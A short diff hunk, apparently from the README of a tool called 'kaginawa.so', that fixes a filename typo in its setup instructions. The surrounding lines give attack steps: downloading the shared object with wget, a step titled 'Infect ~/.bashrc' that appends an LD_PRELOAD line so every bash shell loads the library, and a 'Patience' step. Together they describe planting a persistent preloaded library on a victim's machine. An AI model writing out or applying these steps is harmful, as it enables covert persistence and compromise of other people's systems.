@@ -51,7 +51,7 @@ wget https://example.com/kaginawa.so
 - Second Step: Infect ~/.bashrc
 
 ```bash
-echo 'LD_PRELOAD=/full/path/to/kagianawa.so bash' >> ~/.bashrc
+echo 'LD_PRELOAD=/full/path/to/kaginawa.so bash' >> ~/.bashrc
 ```
 
 - Third Step: Patience
